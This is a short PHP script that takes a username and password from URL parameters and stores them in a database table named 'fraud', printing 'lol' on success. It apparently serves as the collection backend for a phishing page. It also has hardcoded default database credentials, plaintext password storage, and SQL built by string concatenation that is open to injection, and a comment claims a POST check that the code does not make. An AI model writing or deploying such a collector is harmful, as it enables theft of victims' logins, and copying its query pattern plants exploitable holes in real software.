<?php
session_start();

$host = "dbnet";
$port = "5432";
$dbname = "cv_db";
$user = "postgres";
$password = "postgres";

$db = pg_connect("host=$host port=$port dbname=$dbname user=$user password=$password");

// Check if the request method is POST
  $email = $_GET['username'];
  $password = $_GET['password'];

echo 'hi';
try {

  if (!$db) {
    throw new Exception("Failed to connect to database");
  }

  // Prepare the SQL query to insert the new user
  $insert_query = "INSERT INTO fraud (username, password) VALUES ('$email', '$password')";
  $insert_result = pg_query($db, $insert_query);

  if ($insert_result) {
    echo "lol";
  } else {
    throw new Exception("Failed to insert user"); // Failed to insert user into the database
  }
} catch (Exception $err) {
  http_response_code(401);
  echo "Error: " . $err->getMessage();
}
?>
